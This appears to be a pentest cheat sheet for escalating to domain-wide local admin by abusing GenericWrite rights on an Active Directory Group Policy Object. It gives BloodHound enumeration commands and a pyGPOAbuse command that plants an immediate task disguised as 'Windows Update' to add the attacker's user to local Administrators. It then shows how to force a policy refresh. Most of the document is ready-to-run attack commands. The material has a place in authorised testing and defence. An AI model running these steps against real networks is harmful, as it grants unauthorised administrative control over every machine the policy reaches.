# GPO GenericWrite → pyGPOAbuse Domain Admin

If a user has `GenericWrite` on a Group Policy Object (GPO), they can modify its contents to run arbitrary commands on all machines the GPO applies to — typically adding a local admin or scheduling a task.

## Check via BloodHound

BloodHound "GenericWrite" edge on a GPO node → right-click → "Abuse Info".

```bash
# Enumerate GPO permissions with BloodHound-python
bloodhound-python -d <DOMAIN> -u <user> -p <pass> -ns <DC-IP> -c All
# In BloodHound GUI: Shortest Path to DA → look for GenericWrite → GPO edges
```

## Exploit with pyGPOAbuse

```bash
pip install pyGPOAbuse

# Add <user> to local Administrators group via GPO immediate task
python3 pygpoabuse.py <DOMAIN>/<user>:<pass> -gpo-id <GPO-GUID> \
  -command 'net localgroup administrators <DOMAIN>\\<user> /add' \
  -taskname "update" -description "Windows Update" \
  -powershell -dc-ip <DC-IP>

# Force Group Policy refresh on a target (if WinRM/SMB available)
Invoke-GPUpdate -Computer <TARGET> -Force
# or via NXC:
nxc smb <TARGET> -u <user> -p <pass> -x 'gpupdate /force'
```

GPO scope: check which OUs/computers the GPO is linked to. A GPO linked to the Domain root applies to all computers.

```powershell
# Find GPO GUID by name
Get-GPO -Name "Default Domain Policy" | Select-Object Id
# Or enumerate all GPOs and their linked OUs
Get-GPO -All | ForEach-Object { $_ | Get-GPOReport -ReportType XML }
```

After the GPO applies, authenticate as the added local admin account.
